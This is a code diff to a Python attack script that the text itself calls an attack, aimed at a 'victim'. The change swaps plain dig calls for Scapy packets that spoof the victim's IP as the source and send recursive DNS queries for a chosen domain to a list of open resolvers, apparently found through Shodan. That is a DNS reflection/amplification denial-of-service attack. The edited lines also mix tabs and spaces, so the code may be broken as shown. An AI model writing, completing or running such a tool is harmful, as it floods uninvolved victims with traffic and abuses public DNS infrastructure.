@@ -14,7 +14,7 @@ def subprocess_call_commands(command):
 console = Console() 
 
 
-def main(api_key: str,victim:str):
+def main(api_key: str,victim:str,targeted_domain:str):
     #Initialize
     initCommand = "shodan init " + api_key + " > /dev/null 2>&1"
     subprocess_call_commands(initCommand)
@@ -32,9 +32,11 @@ def main(api_key: str,victim:str):
     with console.status("[bold red]Performing attack...[/bold red]"):
         with open('DNS-Resolvers.txt') as f:
             contents = f.readlines()
-            for i in contents:
-                attackCommand = "dig " + victim + " " + i + "> /dev/null 2>&1"
-                subprocess_call_commands(attackCommand)
+            for ip in contents:
+            	dns = IP(src=victim,dst=ip)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=targeted_domain))
+		answer = sr1(dns,verbose=0)
+                #attackCommand = "dig " + victim + " " + i + "> /dev/null 2>&1"
+                #subprocess_call_commands(attackCommand)
     
 
  
